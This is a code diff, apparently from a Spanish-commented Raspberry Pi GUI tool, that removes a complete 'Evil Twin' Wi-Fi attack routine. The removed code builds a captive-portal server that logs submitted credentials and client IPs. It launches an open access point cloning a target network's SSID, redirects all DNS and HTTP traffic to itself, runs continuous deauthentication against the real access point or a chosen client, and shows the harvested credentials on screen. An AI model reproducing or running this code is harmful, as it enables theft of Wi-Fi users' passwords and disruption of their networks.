-            self.path = "/index.html"
-            
-        local_path = self.translate_path(self.path)
-        
-        # Lógica de Redirección (Captive Portal Detector)
-        if not os.path.isfile(local_path):
-            # Prevención del bucle infinito si index.html no se copió correctamente
-            if self.path == "/index.html":
-                self.send_response(200)
-                self.send_header('Content-type', 'text/html')
-                self.end_headers()
-                self.wfile.write(b"<html><body><h2>Error de Servidor: El archivo index.html no existe.</h2></body></html>")
-                return
-                
-            # Si piden algo distinto (ej. generate_204), redirigir al portal
-            self.send_response(302)
-            self.send_header("Location", "http://10.0.0.1/index.html")
-            self.end_headers()
-            return
-            
-        return super().do_GET()
-
-    def do_POST(self):
-        try:
-            length = int(self.headers.get("Content-Length", 0))
-            data = self.rfile.read(length).decode("utf-8", "ignore")
-            params = urllib.parse.parse_qs(data)
-            
-            with open(LOG, "a") as f: 
-                f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} CREDENCIALES:{{params}}\\n")
-                f.flush(); os.fsync(f.fileno())
-        except: pass
-            
-        self.send_response(302)
-        self.send_header("Location", "http://10.0.0.1/success.html")
-        self.end_headers()
-        
-    def log_message(self, format, *args): pass # Silencia logs para no saturar memoria
-
-if __name__ == "__main__":
-    os.chdir("{tmp_web}")
-    # ThreadingHTTPServer atiende múltiples peticiones sin congelarse
-    class ThreadedServer(http.server.ThreadingHTTPServer):
-        allow_reuse_address = True
-        
-    with ThreadedServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd: 
-        httpd.serve_forever()
-'''
-            with open(f"{tmp_web}/capture.py", "w") as f:
-                f.write(capture_script)
-                
-            if not os.path.exists(f"{tmp_web}/success.html"):
-                with open(f"{tmp_web}/success.html", "w") as f:
-                    f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:-apple-system, sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p style="color:#b0c7db;">Ya puede cerrar esta ventana.</p></body></html>')
-
-            # 3. Configuración del Access Point
-            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red['essid']}\nhw_mode=g\nchannel={int(red['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
-            
-            with open("/tmp/hostapd_evil.conf", "w") as f:
-                f.write(hostapd_conf)
-                
-            self.evil_twin_procs['hostapd'] = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
-                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            time.sleep(3)
-
-            # 4. Solución DHCP Raspberry Pi (Prevenir que NetworkManager borre la IP)
-            subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
-            time.sleep(1.5) 
-
-            dnsmasq_conf = f"interface={ap_iface}\nexcept-interface=lo\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
-            with open("/tmp/dnsmasq_evil.conf", "w") as f:
-                f.write(dnsmasq_conf)
-                
-            subprocess.run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
-            self.evil_twin_procs['dnsmasq'] = subprocess.Popen(
-                ["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            time.sleep(2)
-
-            # 5. Iptables limpio (Sin redirigir el puerto 443 para evitar crasheos del servidor Python)
-            subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT",
-                 "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
-            # Solo permitimos el tráfico necesario
-            for port in ["80", "53"]:
-                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
-            for port in ["53", "67"]:
-                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
-
-            # 6. Lanzar servidor web de captura en segundo plano
-            self.evil_twin_procs['capture'] = subprocess.Popen(["sudo", "python3", f"{tmp_web}/capture.py"],
-                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            time.sleep(1)
-
-            # 7. Iniciar inyección de desautenticación si se configuró
-            subprocess.run(["sudo", "iw", "dev", mon_deauth, "set", "channel", red['ch']], stderr=subprocess.DEVNULL,
-                           stdout=subprocess.DEVNULL)
-            deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red['bssid']]
-            if deauth_mode == "directed" and cliente_mac:
-                deauth_cmd.extend(["-c", cliente_mac])
-            deauth_cmd.append(mon_deauth)
-            self.evil_twin_procs['deauth'] = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL,
-                                                              stderr=subprocess.DEVNULL)
-
-            # 8. Bucle de monitoreo para mostrar credenciales en la interfaz de la Pi
-            last_lines = 0
-            while not self.evil_twin_stop:
-                time.sleep(2)
-                if os.path.exists(cred_log):
-                    with open(cred_log, "r") as f:
-                        lines = f.readlines()
-                        if len(lines) > last_lines:
-                            for line in lines[last_lines:]:
-                                self.escribir_consola(f"[+] Cred: {line.strip()}")
-                            last_lines = len(lines)
-
-            # Cierre seguro al presionar "DETENER ATAQUE"
-            self._evil_twin_detener_procesos()
-            self._evil_twin_limpiar_iptables(ap_iface)
-            
-            # Restaurar Modo Monitor y NetworkManager
-            mon_deauth = self.wifi_state.get("mon_deauth")
-            if mon_deauth:
-                subprocess.run(["sudo", "airmon-ng", "stop", mon_deauth], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            self.escribir_consola("[+] Evil Twin detenido y red restaurada.")
-            self.after(0, self.show_wifi_menu)
-
-        self.evil_twin_thread = threading.Thread(target=ataque, daemon=True)
-        self.evil_twin_thread.start()
-
-    # Reemplaza el antiguo _evil_twin_detener por este método:
-    def _evil_twin_detener_click(self):
-        if hasattr(self, 'btn_detener_evil') and self.btn_detener_evil.winfo_exists():
-            self.btn_detener_evil.config(style='Gray.TButton')
-            self.btn_detener_evil.state(['disabled'])
-        self.escribir_consola("[*] Deteniendo procesos y restaurando red...")
-        self.evil_twin_stop = True
     
 
     def _evil_twin_detener_procesos(self):
